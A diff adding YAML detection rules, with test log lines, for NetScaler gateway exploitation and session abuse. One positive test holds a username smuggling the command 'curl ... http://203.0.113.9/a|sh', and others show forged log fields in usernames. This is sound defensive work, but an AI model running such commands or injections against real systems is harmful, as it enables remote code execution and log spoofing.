@@ -1,0 +1,100 @@
+# Gateway / AAA exploitation and session-abuse indicators.
+
+- id: cve-2025-5777-garbage-username
+  title: Non-printable bytes in a rejected username (CitrixBleed 2 exploitation attempt)
+  severity: high
+  sources: [nslog]
+  event_types: ["AAA Message"]
+  match:
+    message_regex: 'Authentication is rejected for .*[\x00-\x08\x0e-\x1f\x7f-\xff]'
+  cve: [CVE-2025-5777]
+  mitre: [T1190]
+  references:
+    - https://www.netscaler.com/blog/news/evaluating-netscaler-logs-for-indicators-of-attempted-exploitation-of-cve-2025-5777/
+  tests:
+    positive:
+      - {source: nslog, line: "Oct  5 10:00:01 <local0.info> 10.0.0.10 2026/10/05:10:00:01 GMT ns-gw-01 0-PPE-1 : default AAA Message 4521 0 : \"Authentication is rejected for \x89\x01\xfeH\x10user\""}
+    negative:
+      - {source: nslog, line: 'Oct  5 10:00:01 <local0.info> 10.0.0.10 2026/10/05:10:00:01 GMT ns-gw-01 0-PPE-1 : default AAA Message 4522 0 : "Authentication is rejected for jsmith"'}
+
+- id: cve-2026-88771-injected-command
+  title: Command text after NSPPE; in a login failure (CVE-2026-88771 exploitation)
+  severity: critical
+  sources: [nslog]
+  match:
+    # Same matches as '(?i)(login|authentication|rejected|fail).*NSPPE;\s*\S', in linear time:
+    # only the first keyword of a line starts the scan for NSPPE;, so repeated keywords in a
+    # long line are not each rescanned to the end (quadratic: 25 s on a 256 KiB line).
+    raw_regex: '(?im)^(?:(?!login|authentication|rejected|fail).)*(?:login|authentication|rejected|fail).*NSPPE;\s*\S'
+  cve: [CVE-2026-88771]
+  mitre: [T1190, T1059]
+  references: [https://unit42.paloaltonetworks.com/netscaler-zero-days-exploited/]
+  tests:
+    positive:
+      - {source: nslog, line: 'Oct  5 10:00:01 <local0.info> 10.0.0.10 2026/10/05:10:00:01 GMT ns-gw-01 0-PPE-0 : default AAATM LOGIN_FAILED 7001 0 : User x NSPPE;curl -s http://203.0.113.9/a|sh - Client_ip 203.0.113.9 - Failure_reason "Invalid credentials"'}
+    negative:
+      - {source: nslog, line: 'Oct  5 10:00:01 <local0.info> 10.0.0.10 2026/10/05:10:00:01 GMT ns-gw-01 0-PPE-0 : default AAATM LOGIN_FAILED 7002 0 : User jsmith - Client_ip 203.0.113.9 - Failure_reason "Invalid credentials"'}
+
+- id: log-field-injection
+  title: Forged log fields in a username (log poisoning to spoof the client IP or status)
+  severity: high
+  sources: [nslog]
+  # Any ns.log event: Gateway/AAA login failures and management (CMD_EXECUTED) logins alike.
+  # The parser keeps the appliance's own fields and lists the forged keys here.
+  match:
+    fields:
+      Field_injection: '\S'
+  dedup_by: [Field_injection]  # a fixed set of key names, so attackers cannot vary it freely
+  mitre: [T1036, T1562]
+  tests:
+    positive:
+      - {source: nslog, line: 'Oct  5 10:00:01 <local0.info> 10.0.0.10 2026/10/05:10:00:01 GMT ns-gw-01 0-PPE-0 : default AAATM LOGIN_FAILED 7003 0 : User x - Client_ip 10.20.0.5 - Client_ip 203.0.113.9 - Failure_reason "Invalid credentials"'}
+      - {source: nslog, line: 'Oct  5 10:00:01 <local0.info> 10.0.0.10 2026/10/05:10:00:01 GMT ns-gw-01 0-PPE-0 : default API CMD_EXECUTED 990 0 : User x - Remote_ip 10.20.0.5 - Remote_ip 198.51.100.7 - Command "login x - Remote_ip 10.20.0.5" - Status "ERROR: Invalid username or password"'}
+    negative:
+      - {source: nslog, line: 'Oct  5 10:00:01 <local0.info> 10.0.0.10 2026/10/05:10:00:01 GMT ns-gw-01 0-PPE-0 : default AAATM LOGIN_FAILED 7004 0 : User jean-luc - Client_ip 203.0.113.9 - Failure_reason "Invalid credentials"'}
+      - {source: nslog, line: 'Oct  5 10:00:01 <local0.info> 10.0.0.10 2026/10/05:10:00:01 GMT ns-gw-01 0-PPE-0 : default API CMD_EXECUTED 991 0 : User admin1 - Remote_ip 10.20.0.5 - Command "login admin1" - Status "Success"'}
+
+- id: ppe-heartbeat-missed
+  title: Packet engine missed heartbeats (crash, often caused by memory-corruption exploits)
+  severity: high
+  sources: [nslog, notice]
+  match:
+    raw_regex: 'pitboss.*PPE(\s*\d+)?\s+missed too many heartbeats|NSPPE.*(core dump|crashed)'
+  cve: [CVE-2026-88772, CVE-2025-6543, CVE-2025-7775]
+  mitre: [T1190, T1499]
+  tests:
+    positive:
+      - {source: notice, line: 'Oct  5 10:00:01 <local0.err> ns-gw-01 pitboss: PPE 1 missed too many heartbeats; restarting'}
+    negative:
+      - {source: notice, line: 'Oct  5 10:00:01 <local0.info> ns-gw-01 pitboss: started process nsppe'}
+
+- id: session-ip-mismatch
+  title: Gateway session used from a different IP than it was established from
+  severity: high
+  sources: [nslog]
+  event_types: ["SSLVPN TCPCONNSTAT"]
+  match:
+    fields_differ: [Client_ip, Source]
+  cve: [CVE-2023-4966, CVE-2025-5777]
+  mitre: [T1550.004]
+  references:
+    - https://cloud.google.com/blog/topics/threat-intelligence/session-hijacking-citrix-cve-2023-4966/
+  tests:
+    positive:
+      - {source: nslog, line: 'Oct  5 10:00:01 <local0.info> 10.0.0.10 2026/10/05:10:00:01 GMT ns-gw-01 0-PPE-0 : default SSLVPN TCPCONNSTAT 8100 0 : Context jsmith@192.0.2.10 - SessionId: 77- User jsmith - Client_ip 192.0.2.10 - Nat_ip "Mapped Ip" - Vserver 10.0.1.20:443 - Source 203.0.113.66:51515 - Destination 10.50.0.12:2598 - Start_time "10/05/2026:09:59:00 GMT" - Total_bytes_send 1200 - Total_bytes_recv 900'}
+    negative:
+      - {source: nslog, line: 'Oct  5 10:00:01 <local0.info> 10.0.0.10 2026/10/05:10:00:01 GMT ns-gw-01 0-PPE-0 : default SSLVPN TCPCONNSTAT 8101 0 : Context jsmith@192.0.2.10 - SessionId: 77- User jsmith - Client_ip 192.0.2.10 - Nat_ip "Mapped Ip" - Vserver 10.0.1.20:443 - Source 192.0.2.10:51515 - Destination 10.50.0.12:2598 - Start_time "10/05/2026:09:59:00 GMT" - Total_bytes_send 1200 - Total_bytes_recv 900'}
+
+- id: gateway-password-spray
+  title: Many failed Gateway logins from one address
+  severity: medium
+  sources: [nslog]
+  events: [LOGIN_FAILED]
+  match: {}
+  threshold: {count: 20, window_seconds: 300, group_by: [Client_ip]}
+  mitre: [T1110.003]
+  tests:
+    positive:
+      - {source: nslog, line: 'Oct  5 10:00:01 <local0.info> 10.0.0.10 2026/10/05:10:00:01 GMT ns-gw-01 0-PPE-0 : default AAATM LOGIN_FAILED 7101 0 : User jsmith - Client_ip 203.0.113.9 - Failure_reason "Invalid credentials"'}
+    negative:
+      - {source: nslog, line: 'Oct  5 10:00:01 <local0.info> 10.0.0.10 2026/10/05:10:00:01 GMT ns-gw-01 0-PPE-0 : default SSLVPN LOGIN 7102 0 : Context jsmith@203.0.113.9 - SessionId: 80- User jsmith - Client_ip 203.0.113.9'}
